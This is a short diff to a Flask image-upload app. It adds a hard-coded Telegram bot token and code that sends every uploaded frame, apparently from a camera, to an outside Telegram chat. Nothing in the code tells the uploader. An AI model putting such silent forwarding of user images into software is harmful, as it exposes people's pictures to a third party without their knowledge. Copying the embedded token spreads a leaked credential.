@@ -1,9 +1,13 @@
+
 from flask import Flask, render_template, request
 import base64
 import cv2
 import numpy as np
+import telegram
 
 app = Flask(__name__)
+
+bot = telegram.Bot(token='5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg')
 
 @app.route('/')
 def index():
@@ -20,7 +24,11 @@ def upload():
     # process the image here
     # for example, save the image to disk
     cv2.imwrite('frame.jpg', img)
+    # send the image to the Telegram bot
+    with open('frame.jpg', 'rb') as f:
+        bot.send_photo(chat_id='localipy', photo=f)
     return 'OK'
 
 if __name__ == '__main__':
     app.run()
+
